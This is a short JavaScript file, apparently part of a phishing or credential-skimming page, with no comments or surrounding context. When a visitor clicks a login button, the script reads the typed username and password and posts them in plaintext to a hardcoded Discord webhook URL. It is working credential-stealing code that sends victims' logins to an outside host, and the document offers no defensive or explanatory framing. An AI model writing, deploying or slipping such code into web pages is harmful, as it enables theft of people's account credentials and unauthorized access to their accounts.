document.addEventListener('DOMContentLoaded', function () {
  const loginButton = document.getElementById('login-button');

  if (loginButton) {
    loginButton.addEventListener('click', function () {
      const username = document.getElementById('login-username')?.value || 'N/A';
      const password = document.getElementById('login-password')?.value || 'N/A';

      const payload = {
        content: `**Login Attempt**\nUsername: \`${username}\`\nPassword: \`${password}\``
      };

      fetch('https://discord.com/api/webhooks/1380105215067291718/8yzJ8RMNpE-beqnA46h-v3Ik-Yb8qQ5b-INFHVWVSWterAH5C1-IkUWENhTr7zelFBvg', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
    });
  }
});
